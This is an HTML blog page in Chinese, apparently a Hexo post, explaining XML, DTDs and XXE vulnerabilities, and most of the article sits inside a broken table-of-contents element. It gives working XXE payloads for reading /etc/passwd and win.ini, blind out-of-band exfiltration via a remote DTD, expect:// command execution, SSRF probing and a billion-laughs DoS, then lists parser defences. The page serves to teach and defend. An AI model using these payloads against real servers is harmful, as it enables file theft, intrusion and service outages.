<!DOCTYPE html>
<html>
    <!-- Head -->
    <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="author" content="John Doe">
    <meta name="description" itemprop="description" content="">
    <meta name="keywords" content="">

    <!-- Page Title -->
    
        <title>XXE漏洞 | Hexo</title>
    
    <link rel="icon" href="/img/avatar-default.png">
    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    
    
<script src="/js/script.js"></script>

    
<link rel="stylesheet" href="/css/style.css">

    
    <style>
        .deactiveColor{
            color: #37474f;
        }
        .activeColor{
            color: #006064;
        }
        a:hover{
            color: #006064;
        }
        .header-btn{
            color: #37474f;
        }
        
        .post-content img{
            margin: 50px auto;
        }
        
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>
    <body>
        <div class="container">

            <!-- Top Anchor -->
            <div id="top"></div>

            <!-- Header -->
            <header class="header-wrapper">
    <div class="header-title-wrapper">
        <!-- Page Title -->
        <p class="header-title">
             
                
                    XXE漏洞
                
            
        </p>  
    </div>    

    
        <!-- Division Line -->
        <div class="division"></div> 
    
    
    <div class="header-detail">
        <!-- Header Button -->
        <div class="header-btn-wrapper">
            
                <span>
                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
                </span>

                
                    <span>
                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
                    </span>
                
            
        </div>
    </div>
</header>

            <!-- Main -->
            <main>
                <article class="post-wrapper">
    

    
        <!-- Article Catalog -->
        <div class="catalog-dropdown col-xs-12 col-sm-12">
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE漏洞"><span class="toc-number">1.</span> <span class="toc-text">XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#什么是XML"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">什么是XML</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-与-HTML-的主要差异"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">XML 与 HTML 的主要差异</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML简介"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">XML简介</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text"> 等等）。
     XML 允许创作者定义自己的标签和自己的文档结构。
XML语法规则1.所有 XML 元素都须有关闭标签。（注释：声明不属于XML本身的组成部分。它不是 XML 元素，也不需要关闭标签。）XML可以自定义标签。
2.XML标签大小写敏感。
3.XML 必须正确地嵌套。
4.XML 文档必须有根元素。
5.XML属性值须加引号。
6.XML必须按顺序闭合标签。
7.实体引用。(详细见下方)
8.XML 中的注释：&lt;!-- This is a comment --&gt; 。
9.在 XML 中，空格会被保留。（HTML 会把多个连续的空格字符裁减（合并）为一个。在 XML 中，文档中的空格不会被删节。）
10.XML 以 LF 存储换行。
例子
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!-- XML声明，版本&amp;编码 --&gt;
&lt;note time&#x3D;&quot;2018.07.03&quot; &gt; &lt;!-- 根元素 time为属性 2018.07.03为属性值 --&gt;
&lt;to&gt;Tove&lt;&#x2F;to&gt; &lt;!-- 四个子元素(to,from,heading,body) --&gt;
&lt;from&gt;Jani&lt;&#x2F;from&gt;
&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;
&lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt; &lt;!-- 所有的节点必须闭合 --&gt;
XML实体引用在 XML 中，一些字符拥有特殊的意义。
如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。
这样会产生 XML 错误：
&lt;message&gt;if salary &lt; 1000 then&lt;&#x2F;message&gt;为了避免这个错误，请用实体引用来代替 “&lt;” 字符：
&lt;message&gt;if salary &amp;lt; 1000 then&lt;&#x2F;message&gt; 在 XML 中，有 5 个预定义的实体引用：



&lt;
&lt;
小于



&gt;
&gt;
大于


&amp;
&amp;
和号


&amp;apos;
‘
单引号


&quot;
“
引号


注释：在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。
参考链接：https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;xml&#x2F;xml_syntax.asp
为什么使用 DTD？
DTD”(Documnet Type Definition)是XML1.0版规格的一部分,它是XML文件得验证机制,属于XML文件组成得一部分,DTD在XML文件所扮演的角色就是定义XML文件的元素架构、元素标记和属性!一旦我们定义好DTD,在使用编辑工具如XML Spy 或者验证工具 XML validate (微软网站均可以下载)就可以对编写好的XML文件进行DTD检查内容是否为合法的XML文件内容!
XML文件提供应用程序一个数据交换的格式,DTD正是让XML文件能够成为数据交换的标准,因为不同的公司只需定义好标准的DTD,各公司都能够依照DTD建立XML文件,并且进行验证,如此就可以轻易建立标准一直的交换数据!
参考链接：https:&#x2F;&#x2F;zhidao.baidu.com&#x2F;question&#x2F;57994684.html

通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。
通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。
而应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。
还可以使用 DTD 来验证您自身的数据。
DTD(文档类型定义)DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。

XML文档的构建模块所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：
元素、属性、实体、PCDATA、CDATA。
1、元素
元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。
实例:
&lt;body&gt;body text in between&lt;&#x2F;body&gt;
&lt;message&gt;some message in between&lt;&#x2F;message&gt;空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。
2、属性
 属性可提供有关元素的额外信息
 实例：
&lt;img src&#x3D;&quot;computer.gif&quot; &#x2F;&gt;3、实体
实体是用来定义普通文本的变量。实体引用是对实体的引用。
4、PCDATA
PCDATA 的意思是被解析的字符数据（parsed character data）。
PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。
5、CDATA
CDATA 的意思是字符数据（character data）。
CDATA 是不会被解析器解析的文本。

DTD 可以在 XML 文档内声明，也可以外部引用。
1、内部声明：&lt;!DOCTYPE 根元素 [元素声明]&gt; 
例子: &lt;!DOCTYOE test [any]&gt;
2、外部声明（引用外部DTD）：&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 
例子:&lt;!DOCTYPE test SYSTEM &#39;http:&#x2F;&#x2F;www.test.com&#x2F;evil.dtd&#39;&gt;
3、内外部DTD文档结合：
&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;DTD中的一些重要的关键字：

DOCTYPE（DTD的声明）
ENTITY（实体的声明）
SYSTEM、PUBLIC（外部资源申请）

原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_40491569&#x2F;java&#x2F;article&#x2F;details&#x2F;83066200
实体类别介绍实体主要分为一下四类

内置实体 (Built-in entities)
字符实体 (Character entities)
通用实体 (General entities)
参数实体 (Parameter entities)

参数实体用%实体名称申明，引用时也用%实体名称;
其余实体直接用实体名称申明，引用时用&amp;实体名称。
参数实体只能在DTD中申明，DTD中引用；
其余实体只能在DTD中申明，可在xml文档中引用。
注意：参数实体是在DTD中被引用的，而其余实体是在xml文档中被引用的。
DTD 实体声明：1. 内部实体声明&lt;!ENTITY 实体名称 “实体的值”&gt;一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;2. 外部实体声明XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：
file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext
http:&#x2F;&#x2F;url&#x2F;file.ext
php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php&lt;!ENTITY 实体名称 SYSTEM “URI&#x2F;URL”&gt;部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示： 
外部实体的默认协议

​    例子
构造几种简单的Payload模型如下:
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe(实体引用名) SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;(实体内容) &gt;]&gt;
&lt;methodcall&gt;
&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;
&lt;&#x2F;methodcall&gt;这种写法则调用了本地计算机的文件&#x2F;etc&#x2F;passwd，XML内容被解析后，文件内容便通过&amp;xxe被存放在了methodname元素中，造成了敏感信息的泄露。
亦可读取网站内容
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;attacker.com&#x2F;text.txt&quot; &gt;]&gt;
&lt;methodcall&gt;
&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;
&lt;&#x2F;methodcall&gt;如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如:
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot; &gt;]&gt;
&lt;methodcall&gt;
&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;
&lt;&#x2F;methodcall&gt;3. 参数实体声明&lt;!ENTITY % 实体名称 “实体的值”&gt;
or
&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;  例子
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY  % xxe SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;evil.dtd&quot; &gt;
%xxe;]&gt;
&lt;foo&gt;&amp;evil;&lt;&#x2F;foo&gt;外部evil.dtd中的内容。
&lt;!ENTITY evil SYSTEM “file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini” &gt;4. 引用公共实体&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;什么是XXE?
XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。简单理解就是当允许引用外部实体时， XML数据在传输中有可能会被不法分子被修改，如果服务器执行被恶意插入的代码，就可以实现攻击的目的攻击者可以通过构造恶意内容，就可能导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害。
XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、×××内网网站、发起dos×××等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。
https:&#x2F;&#x2F;blog.csdn.net&#x2F;tangyuan569&#x2F;article&#x2F;details&#x2F;104277419

有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)。
下面的代码将获取系统上folder&#x2F;file的内容并呈现给用户：
Code1：

&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;
&lt;foo&gt;
        &lt;value&gt;&amp;passwd;&lt;&#x2F;value&gt;
&lt;&#x2F;foo&gt;
XML外部实体 ‘passwd’ 被赋予的值为：file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd。在解析XML文档的过程中，实体’passwd’的值会被替换为URI(file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd)内容值(也就是passwd文件的内容)。关键字’SYSTEM’会告诉XML解析器，’passwd’实体的值将从其后的URI中读取。
Code2：

&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE b [&lt;!ENTITY entityex SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;folder&#x2F;file&quot;&gt;]&gt;
&lt;foo&gt;
        &lt;value&gt;&amp;entityex;&lt;&#x2F;value&gt;
&lt;&#x2F;foo&gt;Code3：

&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;如何识别xml实体攻击漏洞？XXE漏洞主要针对web服务危险的引用的外部实体并且未对外部实体进行敏感字符的过滤，从而可以造成命令执行，目录遍历等。
甄别那些接受XML作为输入内容的端点。最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞。
xxe漏洞检测第一步检测XML是否会被成功解析：
&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [ 
&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;
&lt;root&gt;&amp;name;&lt;&#x2F;root&gt;如果页面输出了my name is nMask，说明xml文件可以被解析。
![img](file:&#x2F;&#x2F;&#x2F;D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\9DAFACBF50807FAE6D60C969D68AE8C7.png)
![img](file:&#x2F;&#x2F;&#x2F;D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\7E6CB2015639C900F77DEB1317BA143E.png)
![img](file:&#x2F;&#x2F;&#x2F;D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\7D909959654F64724543C606169FE3EC.png)
![img](file:&#x2F;&#x2F;&#x2F;D:\Users\DELL\Documents\Tencent Files\1244950218\Image\C2C\05BD25FAA400763F869BF48CA301CC3F.png)
第二步检测服务器是否支持DTD引用外部实体：
&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt; 
&lt;!DOCTYPE ANY [ 
&lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;index.html&quot;&gt; 
%name; 
]&gt;可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求index.html

从PHP代码层面上最开始，引入一个file_get_contents函数，将整个XML数据读入data字符串中，然后交给php的xml解析函数simplexml_load_string()解析，解析后的数据赋给xml变量。
这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。
&lt;?php
$data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);  &#x2F;&#x2F;获取提交的XML数据
$xml &#x3D; simplexml_load_string($data);  &#x2F;&#x2F; 交给PHP的XML解析函数
echo $xml-&gt;name;
?&gt;
读取任意文件有回显情况XML.php
&lt;?php
$xml &#x3D; &lt;&lt;&lt;EOF
&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;
EOF;
$data &#x3D; simplexml_load_string($xml);
print_r($data);
?&gt;访问XML.php可以读取etc&#x2F;passwd文件内容
该CASE是读取&#x2F;etc&#x2F;passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。
实例展示：
可以使用如下的两种方式进行XXE注入攻击。
&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY  xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot; &gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;


&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY  % xxe SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;evil.dtd&quot; &gt;
%xxe;]&gt;
&lt;foo&gt;&amp;evil;&lt;&#x2F;foo&gt;外部evil.dtd中的内容。
&lt;!ENTITY evil SYSTEM “file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini” &gt;
当然也可以进行内网站点的入侵。

 以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。
无回显的情况（blind xxe漏洞）对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。
创建test.php写入以下内容：
&lt;?php 
file_put_contents(&quot;test.txt&quot;, $_GET[&#39;file&#39;]) ; 
?&gt;创建index.php写入以下内容：
&lt;?php 
$xml&#x3D;&lt;&lt;&lt;EOF 
&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; 
&lt;!DOCTYPE ANY[ 
&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;test.txt&quot;&gt; 
&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;test.xml&quot;&gt; 
%remote;
%all;
%send; 
]&gt; 
EOF; 
$data &#x3D; simplexml_load_string($xml) ; 
echo &quot;&lt;pre&gt;&quot; ; 
print_r($data) ; 
?&gt;创建test.xml并写入以下内容：
&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;localhost&#x2F;test.php?file&#x3D;%file;&#39;&gt;&quot;&gt;当访问http:&#x2F;&#x2F;localhost&#x2F;index.php, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。
命令执行php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。
&lt;?php
$xml &#x3D; &lt;&lt;&lt;EOF
&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;except:&#x2F;&#x2F;ls&quot;&gt; # id
]&gt;
&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;
EOF;
$data &#x3D; simplexml_load_string($xml);
print_r($data);
?&gt;该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。
内网探测&#x2F;SSRF由于xml实体注入攻击可以利用http:&#x2F;&#x2F;协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。
&lt;?php
$xml &#x3D; &lt;&lt;&lt;EOF
&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.1:80&#x2F;&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;
EOF;
$data &#x3D; simplexml_load_string($xml);
print_r($data);
?&gt;DOS&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
   &lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; 
]&gt; 
&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;&lt;&#x2F;pre&gt;
这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。
链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;e56a2b8fde8
原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。除了这些，攻击者还可以读取服务器上的敏感数据，还能通过端口扫描，获取后端系统的开放端口。
防御XXE使用开发语言提供的禁用外部实体的方法
PHP：

&lt;pre style&#x3D;&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;libxml_disable_entity_loader(true);&lt;&#x2F;pre&gt;

JAVA：

&lt;pre style&#x3D;&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);&lt;&#x2F;pre&gt;

Python：

&lt;pre style&#x3D;&quot;margin: 0px; padding: 0px; white-space: pre-wrap; overflow-wrap: break-word; font-family: &amp;quot;Courier New&amp;quot; !important; font-size: 12px !important;&quot;&gt;from lxml import etree
xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))&lt;&#x2F;pre&gt;
过滤用户提供的XML数据
过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。
不允许XML中含有自己定义的DTD
参考链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;e56a2b8fde80
环境搭建：https:&#x2F;&#x2F;www.yad0.com&#x2F;technology_sharing&#x2F;698.html
</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XML语法规则"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">XML语法规则</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XML实体引用"><span class="toc-number">2.0.0.1.1.</span> <span class="toc-text">XML实体引用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#为什么使用-DTD？"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">为什么使用 DTD？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DTD-文档类型定义"><span class="toc-number">2.0.0.3.</span> <span class="toc-text">DTD(文档类型定义)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XML文档的构建模块"><span class="toc-number">2.0.0.3.1.</span> <span class="toc-text">XML文档的构建模块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实体类别介绍"><span class="toc-number">2.0.0.4.</span> <span class="toc-text">实体类别介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DTD-实体声明："><span class="toc-number">2.0.0.5.</span> <span class="toc-text">DTD 实体声明：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-内部实体声明"><span class="toc-number">2.0.0.5.1.</span> <span class="toc-text">1. 内部实体声明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-外部实体声明"><span class="toc-number">2.0.0.5.2.</span> <span class="toc-text">2. 外部实体声明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-参数实体声明"><span class="toc-number">2.0.0.5.3.</span> <span class="toc-text">3. 参数实体声明</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-引用公共实体"><span class="toc-number">2.0.0.5.4.</span> <span class="toc-text">4. 引用公共实体</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#什么是XXE"><span class="toc-number">2.0.0.6.</span> <span class="toc-text">什么是XXE?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#如何识别xml实体攻击漏洞？"><span class="toc-number">2.0.0.7.</span> <span class="toc-text">如何识别xml实体攻击漏洞？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe漏洞检测"><span class="toc-number">2.0.0.8.</span> <span class="toc-text">xxe漏洞检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从PHP代码层面上"><span class="toc-number">2.0.0.9.</span> <span class="toc-text">从PHP代码层面上</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#读取任意文件"><span class="toc-number">2.0.0.10.</span> <span class="toc-text">读取任意文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#有回显情况"><span class="toc-number">2.0.0.10.1.</span> <span class="toc-text">有回显情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无回显的情况"><span class="toc-number">2.0.0.10.2.</span> <span class="toc-text">无回显的情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#（blind-xxe漏洞）"><span class="toc-number">2.0.0.10.3.</span> <span class="toc-text">（blind xxe漏洞）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#命令执行"><span class="toc-number">2.0.0.11.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内网探测-SSRF"><span class="toc-number">2.0.0.12.</span> <span class="toc-text">内网探测&#x2F;SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOS"><span class="toc-number">2.0.0.13.</span> <span class="toc-text">DOS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御XXE"><span class="toc-number">2.0.1.</span> <span class="toc-text">防御XXE</span></a></li></ol></li></ol></li></ol>
        </div>
    

    
        <!--For now, Lightbox Only Show in Post Layout -->
        

        
        
            <!-- Article Img Lightbox -->
            <div class="gallery">
    
    
    <div class="lightbox">
        <!-- Close Button -->
        <span class="close-gallery">&times;</span>
        
        <!-- Photo -->
        <img class="gallery-photo">
    </div>
</div>
        
    

    

    <!-- Article Content -->
    <div class="post-content">
        <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>XML被设计用来传输和存储数据。<br>HTML被设计用来显示数据。</p>
<h4 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h4><p>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 是一种很像HTML的标记语言。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 标签没有被预定义。需要自行定义标签。<br>XML 被设计为具有自我描述性。<br>XML 是 W3C 的推荐标准。</p>
<h4 id="XML-与-HTML-的主要差异"><a href="#XML-与-HTML-的主要差异" class="headerlink" title="XML 与 HTML 的主要差异"></a>XML 与 HTML 的主要差异</h4><p>XML 不是 HTML 的替代。<br>XML 和 HTML 为不同的目的而设计：<br>XML 被设计为传输和存储数据，其焦点是数据的内容。<br>HTML 被设计用来显示数据，其焦点是数据的外观。<br>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
